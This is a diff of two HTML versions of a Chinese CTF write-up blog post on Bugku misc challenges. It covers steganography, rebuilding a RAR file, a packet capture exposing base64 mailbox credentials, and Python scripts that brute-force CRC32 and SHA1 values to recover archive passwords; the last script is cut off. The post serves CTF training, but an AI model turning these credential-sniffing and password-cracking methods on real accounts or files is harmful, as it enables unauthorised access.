@@ -1,91 +1,112 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="杂项                           账号被盗了">
-<meta property="og:type" content="article">
-<meta property="og:title" content="bugku-writeup续">
-<meta property="og:url" content="http://chaosec.top/2018/04/03/bugku-writeup%E7%BB%AD/index.html">
-<meta property="og:site_name" content="Aesm1p&#39; Blog">
-<meta property="og:description" content="杂项                           账号被盗了">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://chaosec.top/2018/04/03/bugku-writeup%E7%BB%AD/1.png">
-<meta property="og:image" content="http://chaosec.top/2018/04/03/bugku-writeup%E7%BB%AD/2.png">
-<meta property="og:image" content="http://chaosec.top/2018/04/03/bugku-writeup%E7%BB%AD/3.png">
-<meta property="article:published_time" content="2018-04-03T14:33:55.000Z">
-<meta property="article:modified_time" content="2019-01-30T11:44:01.070Z">
-<meta property="article:author" content="Aesm1p">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://chaosec.top/2018/04/03/bugku-writeup%E7%BB%AD/1.png"><title>bugku-writeup续 | Aesm1p' Blog</title><link ref="canonical" href="http://chaosec.top/2018/04/03/bugku-writeup%E7%BB%AD/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
-var CONFIG = {
-  root: '/',
-  algolia: undefined,
-  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
-  sidebar: undefined,
-  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
-  postWidget: {"endText":true},
-  nightMode: {"enable":true},
-  back2top: {"enable":true},
-  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
-  reward: true,
-  fancybox: true,
-  zoomImage: {"gapAside":"50px"},
-  galleryWaterfall: undefined,
-  lazyload: false,
-  pjax: undefined,
-  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
-  shortcuts: undefined,
-  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
-  sourcePath: {"js":"js","css":"css","images":"images"},
-};
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>bugku-writeup续 | Aesm1p&#39;s Blog | 前方如聂鲁达的爱情诗一般美好</title>
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-shapes"></i></span><span class="header-nav-menu-item__text">Article</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">Archives</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fab fa-buffer"></i></span><span class="header-nav-submenu-item__text">Categories</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">Tags</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-address-card"></i></span><span class="header-nav-menu-item__text">About</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">bugku-writeup续</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon" data-popover="Created Time" data-popover-pos="up"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__value">2018-04-03</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon" data-popover="Updated Time" data-popover-pos="up"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__value">2019-01-30</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon" data-popover="Words Count" data-popover-pos="up"><i class="far fa-file-word"></i></span><span class="post-meta-item__value">4,909</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon" data-popover="Reading Time" data-popover-pos="up"><i class="far fa-clock"></i></span><span class="post-meta-item__value">37m</span></span></div></header><div class="post-body">
-        <h1 id="杂项">
-          <a href="#杂项" class="heading-link"><i class="fas fa-link"></i></a>杂项</h1>
+  
+  <meta name="author" content="Aesm1p">
+  
+
+  
+  <meta name="description" content="相逢意气为君饮">
+  
+
+  
+  
+  <meta name="keywords" content="CTF">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="bugku-writeup续"/>
+
+  <meta property="og:site_name" content="Aesm1p&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Aesm1p&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Aesm1p&#39;s Blog</a>
+    </h1>
+    <p class="site-description">前方如聂鲁达的爱情诗一般美好</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
       
-        <h2 id="账号被盗了">
-          <a href="#账号被盗了" class="heading-link"><i class="fas fa-link"></i></a>账号被盗了</h2>
-      <a id="more"></a>
+        <li><a href="/">HOME</a></li>
+      
+        <li><a href="/archives">ARCHIVES</a></li>
+      
+        <li><a href="/tags">TAGS</a></li>
+      
+        <li><a href="/about">ABOUT</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>bugku-writeup续</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2018/04/03/bugku-writeup续/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-04-03T14:33:55.000Z">
+          2018-04-03
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h2><a id="more"></a>
 <p>先修改浏览器cookie获取，之后可以获得一个可执行文件，是cf的一个刷枪客户端，wireshark抓取一下这个客户端的访问包，可以得到</p>
 <blockquote>
 <p>AUTH LOGIN<br>334 VXNlcm5hbWU6<br>YmtjdGZ0ZXN0QDE2My5jb20=<br>334 UGFzc3dvcmQ6<br>YTEyMzQ1Ng==</p>
 </blockquote>
 <p>这些base64是用户名和密码，登录邮箱即可获得flag，由于邮箱的flag已经被删除了，所以这里附上flag</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;182100518+725593795416&#125;</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="爆照-08067CTF">
-          <a href="#爆照-08067CTF" class="heading-link"><i class="fas fa-link"></i></a>爆照(08067CTF)</h2>
-      <p>binwalk一下发现图面里面隐藏了很多东西，分解一下，得到很多没有后缀名的文件，这题比较坑的地方就是我不知道这些文件都是可以打开的图片，文件88里面包含了一个二维码，扫描一下即可，得到第一段；888文件修改一下后缀名为jpg即可查看一个备注信息是一段base64编码，解码得到第二段值；8888里面隐藏了一张二维码，分解扫码即可得到第三段，拼接即可得到flag</p>
-
-        <h2 id="妹子的陌陌">
-          <a href="#妹子的陌陌" class="heading-link"><i class="fas fa-link"></i></a>妹子的陌陌</h2>
-      <p>上来先binwalk一下看一下，发现还包含一个RAR文件，解压文件发现有密码，查看图片发现图片上有 <code>喜欢我吗.</code> 字样，猜测这就是密码，解压成功后得到一段文本，有一段摩斯密码，解密一下发现是一个解密网站，文本又提示是aes解密，利用题目的密钥解密即可得到一个新的图片地址，访问该图片发现是一个二维码，但是黑白反相了，用PS处理一下（图像-&gt;调整-&gt;反相）                                                                                    </p>
-
-        <h2 id="听首音乐">
-          <a href="#听首音乐" class="heading-link"><i class="fas fa-link"></i></a>听首音乐</h2>
-      <p>音频隐写题目，用Audacity打开可以看到第一行，放大后发现像是摩斯密码，依次写出来解密一下即可，但是注意一定要是大写，小写不行。</p>
-
-        <h2 id="好多数值">
-          <a href="#好多数值" class="heading-link"><i class="fas fa-link"></i></a>好多数值</h2>
-      <p>这些数值是像素点，我们要做到就是把它们重新合成图像，根据像素点个数能够求出可能的图像的规格。</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可能的图片大小</span></span><br><span class="line"><span class="comment"># (1006 , 61)</span></span><br><span class="line"><span class="comment"># (503 , 122)</span></span><br><span class="line"><span class="comment"># (122 , 503)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">	x = <span class="number">503</span></span><br><span class="line">	y = <span class="number">122</span></span><br><span class="line">	im = Image.new(<span class="string">'RGB'</span>,(x,y))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">			line = file.readline()</span><br><span class="line">			rgb = line.split(<span class="string">','</span>)</span><br><span class="line">			im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="convert">
-          <a href="#convert" class="heading-link"><i class="fas fa-link"></i></a>convert</h2>
-      <p>题目给出了一堆二进制数，照常先转为16进制，发现前六位是 <code>526172</code>，查找资料可知这是RAR文件的文件头，所以导出RAR文件，解压查看图片属性即可看到一段base64，解码即可得到flag</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'''</span></span><br><span class="line"><span class="string">0101001001100001011100100010000100011010000001110000000011001111100100000111001100000000000000000000110100000000000000000000</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 这里输入二进制全文，这里只有删除了大部分的内容</span></span><br><span class="line"></span><br><span class="line">b = hex(int(s,<span class="number">2</span>))</span><br><span class="line">a = <span class="string">'52172211a0700cf907300000d00000000000000f7c07420902c000d09000059220000023e6370190a59b34a1d330700200000006b65792e6a70670'</span></span><br><span class="line"><span class="comment"># 16进制全文，注意删除前面的0x字段</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.rar'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> file:</span><br><span class="line">	file.write(a.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="好多压缩包">
-          <a href="#好多压缩包" class="heading-link"><i class="fas fa-link"></i></a>好多压缩包</h2>
-      <p>下载之后是一堆压缩包，发现都有密码，打开之后看到有crc校验值，应该就是CRC32碰撞</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'123/out'</span> + str(I) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line">f = open(<span class="string">'out.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;182100518+725593795416&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h2><p>binwalk一下发现图面里面隐藏了很多东西，分解一下，得到很多没有后缀名的文件，这题比较坑的地方就是我不知道这些文件都是可以打开的图片，文件88里面包含了一个二维码，扫描一下即可，得到第一段；888文件修改一下后缀名为jpg即可查看一个备注信息是一段base64编码，解码得到第二段值；8888里面隐藏了一张二维码，分解扫码即可得到第三段，拼接即可得到flag</p>
+<h2 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h2><p>上来先binwalk一下看一下，发现还包含一个RAR文件，解压文件发现有密码，查看图片发现图片上有 <code>喜欢我吗.</code> 字样，猜测这就是密码，解压成功后得到一段文本，有一段摩斯密码，解密一下发现是一个解密网站，文本又提示是aes解密，利用题目的密钥解密即可得到一个新的图片地址，访问该图片发现是一个二维码，但是黑白反相了，用PS处理一下（图像-&gt;调整-&gt;反相）                                                                                    </p>
+<h2 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h2><p>音频隐写题目，用Audacity打开可以看到第一行，放大后发现像是摩斯密码，依次写出来解密一下即可，但是注意一定要是大写，小写不行。</p>
+<h2 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h2><p>这些数值是像素点，我们要做到就是把它们重新合成图像，根据像素点个数能够求出可能的图像的规格。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可能的图片大小</span></span><br><span class="line"><span class="comment"># (1006 , 61)</span></span><br><span class="line"><span class="comment"># (503 , 122)</span></span><br><span class="line"><span class="comment"># (122 , 503)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">	x = <span class="number">503</span></span><br><span class="line">	y = <span class="number">122</span></span><br><span class="line">	im = Image.new(<span class="string">'RGB'</span>,(x,y))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">			line = file.readline()</span><br><span class="line">			rgb = line.split(<span class="string">','</span>)</span><br><span class="line">			im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>
+<h2 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h2><p>题目给出了一堆二进制数，照常先转为16进制，发现前六位是 <code>526172</code>，查找资料可知这是RAR文件的文件头，所以导出RAR文件，解压查看图片属性即可看到一段base64，解码即可得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'''</span></span><br><span class="line"><span class="string">0101001001100001011100100010000100011010000001110000000011001111100100000111001100000000000000000000110100000000000000000000</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 这里输入二进制全文，这里只有删除了大部分的内容</span></span><br><span class="line"></span><br><span class="line">b = hex(int(s,<span class="number">2</span>))</span><br><span class="line">a = <span class="string">'52172211a0700cf907300000d00000000000000f7c07420902c000d09000059220000023e6370190a59b34a1d330700200000006b65792e6a70670'</span></span><br><span class="line"><span class="comment"># 16进制全文，注意删除前面的0x字段</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.rar'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> file:</span><br><span class="line">	file.write(a.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h2><p>下载之后是一堆压缩包，发现都有密码，打开之后看到有crc校验值，应该就是CRC32碰撞</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'123/out'</span> + str(I) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line">f = open(<span class="string">'out.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
 <p>打开之后可以看到是一段base64，解码之后虽然部分是乱码，但是还可可以看到部分内容 <code>fix the file and get the flag</code> ，意思就是让我们修复这个文件，把解码后的内容导入到文件中，查看一下十六进制发现结尾是rar的文件尾部，推测这是RAR文件，则把文件头补齐一下，解压之后还是没有flag，于是再次查看压缩包，在注释里面找到了flag，（文件十六进制值里面有一个CMT字段，说明RAR文件存在注释）</p>
-
-        <h2 id="一个普通的压缩包-xp0intCTF">
-          <a href="#一个普通的压缩包-xp0intCTF" class="heading-link"><i class="fas fa-link"></i></a>一个普通的压缩包(xp0intCTF)</h2>
-      <p>文件下载之后是个RAR文件，解压之后是个flag.txt，但是里面内容没有flag，所以重点应该还是在这个压缩包，网上看了别人的思路是修改了文件的十六进制值部分改为 <code>A8 3C 74</code> ，这样再次进行解压即可解压出一个png图片，但是查看十六进制值发现前缀是GIF前缀，修改后缀为GIF，在ps中有两个图层，再把这两个图层分别保存为gif文件，之后再用stegsolve查看即可看到二维码，分别保存，再在ps中上下拼接成二维码，坑点在于拼接之后的二维码还需要修复一下：将下面的图片下面的左半部分拼接左上角，另外还要讲左半部分的定位快在拼接到右上角的空块中。</p>
-
-        <h2 id="就五层你能解开吗">
-          <a href="#就五层你能解开吗" class="heading-link"><i class="fas fa-link"></i></a>就五层你能解开吗</h2>
-      <p>根据提示第一层是crc32碰撞，可以看到压缩包的3个txt文件都是6字节，所以猜测应该是用这三个TXT文件的crc32校验值来做。用github上的一个项目来做一下</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python crc32.py reverse 0x4dad5967</span><br></pre></td></tr></table></div></figure>
+<h2 id="一个普通的压缩包-xp0intCTF"><a href="#一个普通的压缩包-xp0intCTF" class="headerlink" title="一个普通的压缩包(xp0intCTF)"></a>一个普通的压缩包(xp0intCTF)</h2><p>文件下载之后是个RAR文件，解压之后是个flag.txt，但是里面内容没有flag，所以重点应该还是在这个压缩包，网上看了别人的思路是修改了文件的十六进制值部分改为 <code>A8 3C 74</code> ，这样再次进行解压即可解压出一个png图片，但是查看十六进制值发现前缀是GIF前缀，修改后缀为GIF，在ps中有两个图层，再把这两个图层分别保存为gif文件，之后再用stegsolve查看即可看到二维码，分别保存，再在ps中上下拼接成二维码，坑点在于拼接之后的二维码还需要修复一下：将下面的图片下面的左半部分拼接左上角，另外还要讲左半部分的定位快在拼接到右上角的空块中。</p>
+<h2 id="就五层你能解开吗"><a href="#就五层你能解开吗" class="headerlink" title="就五层你能解开吗"></a>就五层你能解开吗</h2><p>根据提示第一层是crc32碰撞，可以看到压缩包的3个txt文件都是6字节，所以猜测应该是用这三个TXT文件的crc32校验值来做。用github上的一个项目来做一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python crc32.py reverse 0x4dad5967</span><br></pre></td></tr></table></figure>
 <p>得到</p>
 <blockquote>
 <p>4 bytes: {0x1b, 0xd6, 0x38, 0xc2}<br>verification checksum: 0x4dad5967 (OK)<br>alternative: 9rNYn3 (OK)<br>alternative: Ay8sZC (OK)<br>alternative: QHSaFX (OK)<br>alternative: TmQA5n (OK)<br>alternative: VQT_ls (OK)<br>alternative: X28BT9 (OK)<br>alternative: _GLQzV (OK)<br>alternative: goMEPt (OK)<br>alternative: nyUKFQ (OK)<br>alternative: t_s4f3 (OK)<br>alternative: xQxVkx (OK)<br>alternative: yQ9gpa (OK)</p>
@@ -93,7 +114,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></he
 <p>把三个校验码都跑一下，然后提取其中相对有意义的结果拼起来可以得到解压密码 <code>_CRC32_i5_n0t_s4f3</code> ，第一层解开！</p>
 <p>第二层是维吉尼亚密码，题目给出了近一万条密钥，直接暴力破解肯定是不可能的，但是我们发现密文第一个单词为 <code>rla</code> 只有三个字母，我们可以推测这三个字母的含义，我想了几个可能的情况</p>
 <div class="table-container">
-<div class="table-container"><table>
+<table>
 <thead>
 <tr>
 <th style="text-align:center">明文</th>
@@ -123,7 +144,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></he
 <td style="text-align:center">hhc</td>
 </tr>
 </tbody>
-</table></div>
+</table>
 </div>
 <p>查表发现只有第一个可以找到对应密钥，尝试解密一下</p>
 <blockquote>
@@ -131,499 +152,184 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></he
 </blockquote>
 <p>语义通顺，应该就是这个，用密钥尝试解压缩包，成功，第二层解开！</p>
 <p>第三次sha1碰撞，继续上脚本</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">keys = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(s)</span>:</span></span><br><span class="line">    sha1_hash = hashlib.sha1()</span><br><span class="line">    sha1_hash.update(s)</span><br><span class="line">    <span class="keyword">return</span> sha1_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">		<span class="keyword">for</span> p <span class="keyword">in</span> keys:</span><br><span class="line">			<span class="keyword">for</span> q <span class="keyword">in</span> keys:</span><br><span class="line">				password = i + <span class="string">'7'</span> + j + <span class="string">'5-'</span> + p + <span class="string">'4'</span> + q + <span class="string">'3?'</span> </span><br><span class="line">				sha = sha1(password.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">				<span class="keyword">if</span> sha[<span class="number">0</span>:<span 